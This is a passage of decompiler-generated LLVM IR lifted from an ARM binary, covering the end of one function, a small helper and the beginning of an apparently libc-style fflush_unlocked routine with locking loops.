  %v7_168d4 = icmp eq i32 %v2_168d0, 48
  %v1_168d8 = add i32 %v0_168f02, 32
  %v2_168d8 = inttoptr i32 %v1_168d8 to i32*
  %v3_168d8 = load i32, i32* %v2_168d8, align 4
  store i32 %v3_168d8, i32* %r4.global-to-local, align 4
  br i1 %v7_168d4, label %dec_label_pc_168e4, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_168cc
  store i32 %v0_168f02, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16904

dec_label_pc_168e4:                               ; preds = %dec_label_pc_168cc
  %v0_168e4 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_168e4 = icmp eq i32 %v0_168e4, 0
  br i1 %v2_168e4, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_168e4
  %v1_168e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_168e8 = load i32, i32* %r7.global-to-local, align 4
  %v3_168e8 = add i32 %v2_168e8, %v1_168e8
  %v4_168e8 = inttoptr i32 %v3_168e8 to i32*
  %v5_168e8 = load i32, i32* %v4_168e8, align 4
  store i32 %v5_168e8, i32* %r3.global-to-local, align 4
  %v3_168ec = inttoptr i32 %v5_168e8 to i32*
  store i32 %v3_168d8, i32* %v3_168ec, align 4
  %v0_168f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_168f0 = inttoptr i32 %v0_168f0 to i16*
  %v2_168f0 = load i16, i16* %v1_168f0, align 2
  %v3_168f0 = zext i16 %v2_168f0 to i32
  store i32 %v3_168f0, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_168e4
  %v2_168f08 = load i16, i16* %v1_168cc, align 2
  %v3_168f09 = zext i16 %v2_168f08 to i32
  store i32 %v3_168f09, i32* %r3.global-to-local, align 4
  %v3_168f4 = add i32 %v0_168e4, 32
  %v4_168f4 = inttoptr i32 %v3_168f4 to i32*
  store i32 %v3_168d8, i32* %v4_168f4, align 4
  %v0_168f8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_168f8 = phi i32 [ %v3_168f0, %.thread ], [ %v0_168f8.pre, %bb49 ]
  %v1_168f8 = and i32 %v0_168f8, 8192
  %v2_168f8 = icmp eq i32 %v1_168f8, 0
  br i1 %v2_168f8, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_168fc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_168fc, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_16900 = xor i1 %v2_168f8, true
  call void @__pseudo_cond_branch(i1 %v1_16900, i32 ptrtoint (i32* @global_var_131f4.32 to i32))
  %v0_16904.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16904

dec_label_pc_16904:                               ; preds = %.thread38, %bb52
  %v0_16904 = phi i32 [ %v0_16904.pre, %bb52 ], [ %v3_168d8, %.thread38 ]
  store i32 %v0_16904, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16908 = icmp eq i32 %v0_16904, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_16908, label %dec_label_pc_16914, label %dec_label_pc_168cc

dec_label_pc_16914:                               ; preds = %dec_label_pc_16904, %dec_label_pc_168a0
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16918 = load i32, i32* %r5.global-to-local, align 4
  %v2_16918 = add i32 %v0_16918, 152
  %v3_16918 = inttoptr i32 %v2_16918 to i32*
  %v4_16918 = load i32, i32* %v3_16918, align 4
  store i32 %v4_16918, i32* %r0.global-to-local, align 4
  %v1_1691c = add i32 %v4_16918, 4
  %v2_1691c = inttoptr i32 %v1_1691c to i32*
  %v3_1691c = load i32, i32* %v2_1691c, align 4
  %v1_16920 = add i32 %v3_1691c, -1
  store i32 %v1_16920, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16924 = icmp eq i32 %v1_16920, 0
  store i32 %v1_16920, i32* %v2_1691c, align 4
  br i1 %v2_16924, label %dec_label_pc_16930, label %dec_label_pc_16990

dec_label_pc_16930:                               ; preds = %dec_label_pc_16914
  %v0_16930 = load i32, i32* %r3.global-to-local, align 4
  %v1_16930 = load i32, i32* %r0.global-to-local, align 4
  %v2_16930 = add i32 %v1_16930, 8
  %v3_16930 = inttoptr i32 %v2_16930 to i32*
  store i32 %v0_16930, i32* %v3_16930, align 4
  %v0_16934 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16934, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16938

dec_label_pc_16938:                               ; preds = %dec_label_pc_16968.dec_label_pc_16938_crit_edge, %dec_label_pc_16930
  %v0_16938 = phi i32 [ %v0_16938.pre, %dec_label_pc_16968.dec_label_pc_16938_crit_edge ], [ %v0_16934, %dec_label_pc_16930 ]
  %v1_16938 = inttoptr i32 %v0_16938 to i32*
  %v2_16938 = load i32, i32* %v1_16938, align 4
  store i32 %v2_16938, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16938, i32* %r2.global-to-local, align 4
  %v2_1694474 = load i32, i32* %v1_16938, align 4
  store i32 %v2_1694474, i32* %r3.global-to-local, align 4
  %v3_1694876 = icmp uge i32 %v2_1694474, %v2_16938
  store i1 %v3_1694876, i1* %cpsr_c.global-to-local, align 1
  %v9_1694882 = icmp eq i32 %v2_1694474, %v2_16938
  br i1 %v9_1694882, label %dec_label_pc_16950, label %dec_label_pc_16968

dec_label_pc_16950:                               ; preds = %dec_label_pc_16938, %dec_label_pc_16950.dec_label_pc_16944_crit_edge
  %v0_1695083 = phi i32 [ %v1_16948.pre, %dec_label_pc_16950.dec_label_pc_16944_crit_edge ], [ %v2_16938, %dec_label_pc_16938 ]
  store i32 %v0_1695083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16960 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16960, label %dec_label_pc_16964, label %dec_label_pc_16950.dec_label_pc_16944_crit_edge

dec_label_pc_16950.dec_label_pc_16944_crit_edge:  ; preds = %dec_label_pc_16950
  %v0_16944.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16948.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16944 = inttoptr i32 %v0_16944.pre to i32*
  %v2_16944 = load i32, i32* %v1_16944, align 4
  store i32 %v2_16944, i32* %r3.global-to-local, align 4
  %v3_16948 = icmp uge i32 %v2_16944, %v1_16948.pre
  store i1 %v3_16948, i1* %cpsr_c.global-to-local, align 1
  %v9_16948 = icmp eq i32 %v2_16944, %v1_16948.pre
  br i1 %v9_16948, label %dec_label_pc_16950, label %dec_label_pc_16968

dec_label_pc_16964:                               ; preds = %dec_label_pc_16950
  %v0_16964 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16964, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16968

dec_label_pc_16968:                               ; preds = %dec_label_pc_16938, %dec_label_pc_16950.dec_label_pc_16944_crit_edge, %dec_label_pc_16964
  %v0_16970 = phi i32 [ %v0_16964, %dec_label_pc_16964 ], [ %v2_1694474, %dec_label_pc_16938 ], [ %v2_16944, %dec_label_pc_16950.dec_label_pc_16944_crit_edge ]
  %v1_16968 = phi i32 [ %v0_16964, %dec_label_pc_16964 ], [ %v2_16938, %dec_label_pc_16938 ], [ %v1_16948.pre, %dec_label_pc_16950.dec_label_pc_16944_crit_edge ]
  %v3_16968 = icmp uge i32 %v0_16970, %v1_16968
  store i1 %v3_16968, i1* %cpsr_c.global-to-local, align 1
  %v9_16968 = icmp eq i32 %v0_16970, %v1_16968
  br i1 %v9_16968, label %dec_label_pc_16970, label %dec_label_pc_16968.dec_label_pc_16938_crit_edge

dec_label_pc_16968.dec_label_pc_16938_crit_edge:  ; preds = %dec_label_pc_16968
  %v0_16938.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16938

dec_label_pc_16970:                               ; preds = %dec_label_pc_16968
  %v2_16970 = icmp ne i32 %v1_16968, 0
  store i1 %v2_16970, i1* %cpsr_c.global-to-local, align 1
  %v7_16974 = icmp slt i32 %v1_16968, 2
  br i1 %v7_16974, label %dec_label_pc_16990, label %dec_label_pc_16978

dec_label_pc_16978:                               ; preds = %dec_label_pc_16970
  %v0_16978 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16978, i32* %r0.global-to-local, align 4
  %v0_1697c = load i32, i32* %r1.global-to-local, align 4
  %v1_1697c = add i32 %v0_1697c, 129
  store i32 %v1_1697c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16990

dec_label_pc_16990:                               ; preds = %dec_label_pc_16914, %dec_label_pc_16978, %dec_label_pc_16970
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16994 = load i32, i32* %r5.global-to-local, align 4
  %v2_16994 = add i32 %v0_16994, 80
  %v3_16994 = inttoptr i32 %v2_16994 to i32*
  %v4_16994 = load i32, i32* %v3_16994, align 4
  store i32 %v4_16994, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1699c = inttoptr i32 %v4_16994 to i32*
  store i32 0, i32* %v2_1699c, align 4
  br label %dec_label_pc_169a0

dec_label_pc_169a0:                               ; preds = %dec_label_pc_16814, %dec_label_pc_1683c, %dec_label_pc_16990
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_169a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_169a4 = add i32 %v0_169a4, 160
  %v3_169a4 = inttoptr i32 %v2_169a4 to i32*
  %v4_169a4 = load i32, i32* %v3_169a4, align 4
  store i32 %v4_169a4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_169ac = add i32 %v0_169a4, 12
  %v3_169ac = inttoptr i32 %v2_169ac to i32*
  %v4_169ac = load i32, i32* %v3_169ac, align 4
  store i32 %v4_169ac, i32* %r1.global-to-local, align 4
  %v1_169b0 = add i32 %v4_169a4, 4
  %v2_169b0 = inttoptr i32 %v1_169b0 to i32*
  %v3_169b0 = load i32, i32* %v2_169b0, align 4
  store i32 %v3_169b0, i32* %r2.global-to-local, align 4
  %v1_169b4 = inttoptr i32 %v4_169ac to i32*
  %v2_169b4 = load i32, i32* %v1_169b4, align 4
  %v1_169b8 = add i32 %v3_169b0, -1
  store i32 %v1_169b8, i32* %r2.global-to-local, align 4
  %v1_169bc = add i32 %v2_169b4, -1
  store i32 %v1_169bc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_169c0 = icmp eq i32 %v1_169b8, 0
  store i32 %v1_169bc, i32* %v1_169b4, align 4
  %v0_169c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_169c8 = load i32, i32* %r0.global-to-local, align 4
  %v2_169c8 = add i32 %v1_169c8, 4
  %v3_169c8 = inttoptr i32 %v2_169c8 to i32*
  store i32 %v0_169c8, i32* %v3_169c8, align 4
  br i1 %v2_169c0, label %dec_label_pc_169d0, label %dec_label_pc_16a30

dec_label_pc_169d0:                               ; preds = %dec_label_pc_169a0
  %v0_169d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_169d0 = load i32, i32* %r0.global-to-local, align 4
  %v2_169d0 = add i32 %v1_169d0, 8
  %v3_169d0 = inttoptr i32 %v2_169d0 to i32*
  store i32 %v0_169d0, i32* %v3_169d0, align 4
  %v0_169d4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_169d4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_169d8

dec_label_pc_169d8:                               ; preds = %dec_label_pc_16a08.dec_label_pc_169d8_crit_edge, %dec_label_pc_169d0
  %v0_169d8 = phi i32 [ %v0_169d8.pre, %dec_label_pc_16a08.dec_label_pc_169d8_crit_edge ], [ %v0_169d4, %dec_label_pc_169d0 ]
  %v1_169d8 = inttoptr i32 %v0_169d8 to i32*
  %v2_169d8 = load i32, i32* %v1_169d8, align 4
  store i32 %v2_169d8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_169d8, i32* %r2.global-to-local, align 4
  %v2_169e462 = load i32, i32* %v1_169d8, align 4
  store i32 %v2_169e462, i32* %r3.global-to-local, align 4
  %v3_169e864 = icmp uge i32 %v2_169e462, %v2_169d8
  store i1 %v3_169e864, i1* %cpsr_c.global-to-local, align 1
  %v9_169e870 = icmp eq i32 %v2_169e462, %v2_169d8
  br i1 %v9_169e870, label %dec_label_pc_169f0, label %dec_label_pc_16a08

dec_label_pc_169f0:                               ; preds = %dec_label_pc_169d8, %dec_label_pc_169f0.dec_label_pc_169e4_crit_edge
  %v0_169f071 = phi i32 [ %v1_169e8.pre, %dec_label_pc_169f0.dec_label_pc_169e4_crit_edge ], [ %v2_169d8, %dec_label_pc_169d8 ]
  store i32 %v0_169f071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16a00 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16a00, label %dec_label_pc_16a04, label %dec_label_pc_169f0.dec_label_pc_169e4_crit_edge

dec_label_pc_169f0.dec_label_pc_169e4_crit_edge:  ; preds = %dec_label_pc_169f0
  %v0_169e4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_169e8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_169e4 = inttoptr i32 %v0_169e4.pre to i32*
  %v2_169e4 = load i32, i32* %v1_169e4, align 4
  store i32 %v2_169e4, i32* %r3.global-to-local, align 4
  %v3_169e8 = icmp uge i32 %v2_169e4, %v1_169e8.pre
  store i1 %v3_169e8, i1* %cpsr_c.global-to-local, align 1
  %v9_169e8 = icmp eq i32 %v2_169e4, %v1_169e8.pre
  br i1 %v9_169e8, label %dec_label_pc_169f0, label %dec_label_pc_16a08

dec_label_pc_16a04:                               ; preds = %dec_label_pc_169f0
  %v0_16a04 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16a04, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16a08

dec_label_pc_16a08:                               ; preds = %dec_label_pc_169d8, %dec_label_pc_169f0.dec_label_pc_169e4_crit_edge, %dec_label_pc_16a04
  %v0_16a10 = phi i32 [ %v0_16a04, %dec_label_pc_16a04 ], [ %v2_169e462, %dec_label_pc_169d8 ], [ %v2_169e4, %dec_label_pc_169f0.dec_label_pc_169e4_crit_edge ]
  %v1_16a08 = phi i32 [ %v0_16a04, %dec_label_pc_16a04 ], [ %v2_169d8, %dec_label_pc_169d8 ], [ %v1_169e8.pre, %dec_label_pc_169f0.dec_label_pc_169e4_crit_edge ]
  %v3_16a08 = icmp uge i32 %v0_16a10, %v1_16a08
  store i1 %v3_16a08, i1* %cpsr_c.global-to-local, align 1
  %v9_16a08 = icmp eq i32 %v0_16a10, %v1_16a08
  br i1 %v9_16a08, label %dec_label_pc_16a10, label %dec_label_pc_16a08.dec_label_pc_169d8_crit_edge

dec_label_pc_16a08.dec_label_pc_169d8_crit_edge:  ; preds = %dec_label_pc_16a08
  %v0_169d8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_169d8

dec_label_pc_16a10:                               ; preds = %dec_label_pc_16a08
  %v2_16a10 = icmp ne i32 %v1_16a08, 0
  store i1 %v2_16a10, i1* %cpsr_c.global-to-local, align 1
  %v7_16a14 = icmp slt i32 %v1_16a08, 2
  br i1 %v7_16a14, label %dec_label_pc_16a30, label %dec_label_pc_16a18

dec_label_pc_16a18:                               ; preds = %dec_label_pc_16a10
  %v0_16a18 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16a18, i32* %r0.global-to-local, align 4
  %v0_16a1c = load i32, i32* %r1.global-to-local, align 4
  %v1_16a1c = add i32 %v0_16a1c, 129
  store i32 %v1_16a1c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16a30

dec_label_pc_16a30:                               ; preds = %dec_label_pc_169a0, %dec_label_pc_16a18, %dec_label_pc_16a10
  %v2_16a34 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16a34, i32* %r4.global-to-local, align 4
  %v1_16a38 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16a38

; uselistorder directives
  uselistorder i32 %v0_16a04, { 1, 0, 2 }
  uselistorder i32 %v1_169e8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_169d8, { 1, 0 }
  uselistorder i32 %v0_16964, { 1, 0, 2 }
  uselistorder i32 %v1_16948.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16938, { 1, 0 }
  uselistorder i32 %v0_16904, { 2, 1, 0 }
  uselistorder i32 %v0_168a8, { 1, 0 }
  uselistorder i32 %v0_1688c, { 1, 0, 2 }
  uselistorder i32 %v1_16870.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1685c, { 1, 0 }
  uselistorder i32 %v0_16800, { 1, 0, 2 }
  uselistorder i32 %v1_167e4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_167b8, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 10, 9, 11, 13, 12, 14 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 44, 4, 5, 6, 7, 8, 9, 10, 12, 11, 41, 13, 14, 15, 38, 39, 16, 17, 18, 19, 20, 21, 22, 24, 23, 42, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 43, 37, 40 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 19, 20, 3, 4, 5, 6, 21, 22, 7, 10, 8, 9, 27, 11, 12, 23, 24, 13, 14, 15, 16, 17, 25, 26, 18 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 2, 0, 5, 3, 4, 1 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16a30, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16a08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_169f0, { 1, 0 }
  uselistorder label %dec_label_pc_169a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16990, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16968, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16950, { 1, 0 }
  uselistorder label %dec_label_pc_16904, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_168cc, { 1, 0 }
  uselistorder label %dec_label_pc_168a0, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_16890, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16878, { 1, 0 }
  uselistorder label %dec_label_pc_16814, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_16804, { 2, 1, 0 }
  uselistorder label %dec_label_pc_167ec, { 1, 0 }
}

define i32 @function_16a40(i32 %arg1) local_unnamed_addr {
dec_label_pc_16a40:
  %v0_16a40 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16a40, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16a40
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16a40, %bb
  %v10_16a54 = phi i32 [ %arg1, %dec_label_pc_16a40 ], [ 0, %bb ]
  ret i32 %v10_16a54

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_16a58 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r6, align 4
  %v4_16a68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 76) to i32*), align 4
  store i32 %v4_16a68, i32* %r3.global-to-local, align 4
  %v4_16a6c = icmp uge i32 %tmp, %v4_16a68
  store i1 %v4_16a6c, i1* %cpsr_c.global-to-local, align 1
  %v10_16a6c = icmp eq i32 %tmp, %v4_16a68
  br i1 %v10_16a6c, label %bb, label %dec_label_pc_16a84

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_16a94

dec_label_pc_16a84:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_16a88 = icmp eq i16* %arg1, null
  br i1 %v3_16a88, label %dec_label_pc_16a94, label %dec_label_pc_16da8

dec_label_pc_16a94:                               ; preds = %bb, %dec_label_pc_16a84
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_16a84 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_16a98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 160) to i32*), align 4
  store i32 %v4_16a98, i32* %r5.global-to-local, align 4
  %v0_16a9c = call i32 @__aeabi_read_tp()
  store i32 %v0_16a9c, i32* %r0.global-to-local, align 4
  %v1_16aa0 = add i32 %v4_16a98, 8
  %v2_16aa0 = inttoptr i32 %v1_16aa0 to i32*
  %v3_16aa0 = load i32, i32* %v2_16aa0, align 4
  store i32 %v3_16aa0, i32* %r3.global-to-local, align 4
  %v1_16aa4 = add i32 %v0_16a9c, -1168
  store i32 %v1_16aa4, i32* %r8.global-to-local, align 4
  %v3_16aa8 = icmp uge i32 %v3_16aa0, %v1_16aa4
  store i1 %v3_16aa8, i1* %cpsr_c.global-to-local, align 1
  %v9_16aa8 = icmp eq i32 %v3_16aa0, %v1_16aa4
  br i1 %v9_16aa8, label %dec_label_pc_16af0, label %dec_label_pc_16ab0

dec_label_pc_16ab0:                               ; preds = %dec_label_pc_16a94
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16a98, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16abc143 = inttoptr i32 %v4_16a98 to i32*
  %v2_16abc144 = load i32, i32* %v1_16abc143, align 4
  store i32 %v2_16abc144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16ac0146 = icmp eq i32 %v2_16abc144, 0
  br i1 %v9_16ac0146, label %dec_label_pc_16ac8, label %dec_label_pc_16ae0

dec_label_pc_16ac8:                               ; preds = %dec_label_pc_16ab0, %dec_label_pc_16ac8.dec_label_pc_16abc_crit_edge
  %v0_16ac8147 = phi i32 [ %v1_16ac0.pre, %dec_label_pc_16ac8.dec_label_pc_16abc_crit_edge ], [ 0, %dec_label_pc_16ab0 ]
  store i32 %v0_16ac8147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16ad8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16ad8, label %dec_label_pc_16adc, label %dec_label_pc_16ac8.dec_label_pc_16abc_crit_edge

dec_label_pc_16ac8.dec_label_pc_16abc_crit_edge:  ; preds = %dec_label_pc_16ac8
  %v0_16abc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16ac0.pre = load i32, i32* @r4, align 4
  %v1_16abc = inttoptr i32 %v0_16abc.pre to i32*
  %v2_16abc = load i32, i32* %v1_16abc, align 4
  store i32 %v2_16abc, i32* %r3.global-to-local, align 4
  %v3_16ac0 = icmp uge i32 %v2_16abc, %v1_16ac0.pre
  store i1 %v3_16ac0, i1* %cpsr_c.global-to-local, align 1
  %v9_16ac0 = icmp eq i32 %v2_16abc, %v1_16ac0.pre
  br i1 %v9_16ac0, label %dec_label_pc_16ac8, label %dec_label_pc_16ae0

dec_label_pc_16adc:                               ; preds = %dec_label_pc_16ac8
  %v0_16adc = load i32, i32* @r4, align 4
  store i32 %v0_16adc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ae0

dec_label_pc_16ae0:                               ; preds = %dec_label_pc_16ab0, %dec_label_pc_16ac8.dec_label_pc_16abc_crit_edge, %dec_label_pc_16adc
  %v0_16ae0 = phi i32 [ %v0_16adc, %dec_label_pc_16adc ], [ %v2_16abc144, %dec_label_pc_16ab0 ], [ %v2_16abc, %dec_label_pc_16ac8.dec_label_pc_16abc_crit_edge ]
  %v1_16ae0 = phi i32 [ %v0_16adc, %dec_label_pc_16adc ], [ 0, %dec_label_pc_16ab0 ], [ %v1_16ac0.pre, %dec_label_pc_16ac8.dec_label_pc_16abc_crit_edge ]
  %v3_16ae0 = icmp uge i32 %v0_16ae0, %v1_16ae0
  store i1 %v3_16ae0, i1* %cpsr_c.global-to-local, align 1
  %v9_16ae0 = icmp eq i32 %v0_16ae0, %v1_16ae0
  br i1 %v9_16ae0, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_16ae0
  %v1_16ae4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16ae4, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_16ae0, %bb65
  %v1_16ae8 = xor i1 %v9_16ae0, true
  call void @__pseudo_cond_branch(i1 %v1_16ae8, i32 ptrtoint (i32* @global_var_143ac.505 to i32))
  %v0_16aec = load i32, i32* %r8.global-to-local, align 4
  %v1_16aec = load i32, i32* %r5.global-to-local, align 4
  %v2_16aec = add i32 %v1_16aec, 8
  %v3_16aec = inttoptr i32 %v2_16aec to i32*
  store i32 %v0_16aec, i32* %v3_16aec, align 4
  br label %dec_label_pc_16af0

dec_label_pc_16af0:                               ; preds = %dec_label_pc_16a94, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16af4 = load i32, i32* @r6, align 4
  %v2_16af4 = add i32 %v0_16af4, 160
  %v3_16af4 = inttoptr i32 %v2_16af4 to i32*
  %v4_16af4 = load i32, i32* %v3_16af4, align 4
  store i32 %v4_16af4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16afc = add i32 %v0_16af4, 12
  %v3_16afc = inttoptr i32 %v2_16afc to i32*
  %v4_16afc = load i32, i32* %v3_16afc, align 4
  store i32 %v4_16afc, i32* %r2.global-to-local, align 4
  %v1_16b00 = add i32 %v4_16af4, 4
  %v2_16b00 = inttoptr i32 %v1_16b00 to i32*
  %v3_16b00 = load i32, i32* %v2_16b00, align 4
  store i32 %v3_16b00, i32* %r1.global-to-local, align 4
  %v1_16b04 = inttoptr i32 %v4_16afc to i32*
  %v2_16b04 = load i32, i32* %v1_16b04, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16b08 = icmp eq i32 %v3_16b00, 0
  %v1_16b0c = add i32 %v2_16b04, 1
  store i32 %v1_16b0c, i32* %r3.global-to-local, align 4
  store i32 %v1_16b0c, i32* %v1_16b04, align 4
  br i1 %v2_16b08, label %dec_label_pc_16b18, label %dec_label_pc_16b78

dec_label_pc_16b18:                               ; preds = %dec_label_pc_16af0
  %v0_16b18 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b18 = load i32, i32* %r0.global-to-local, align 4
  %v2_16b18 = add i32 %v1_16b18, 8
  %v3_16b18 = inttoptr i32 %v2_16b18 to i32*
  store i32 %v0_16b18, i32* %v3_16b18, align 4
  %v0_16b1c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16b1c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16b20

dec_label_pc_16b20:                               ; preds = %dec_label_pc_16b50.dec_label_pc_16b20_crit_edge, %dec_label_pc_16b18
  %v0_16b20 = phi i32 [ %v0_16b20.pre, %dec_label_pc_16b50.dec_label_pc_16b20_crit_edge ], [ %v0_16b1c, %dec_label_pc_16b18 ]
  %v1_16b20 = inttoptr i32 %v0_16b20 to i32*
  %v2_16b20 = load i32, i32* %v1_16b20, align 4
  store i32 %v2_16b20, i32* @r4, align 4
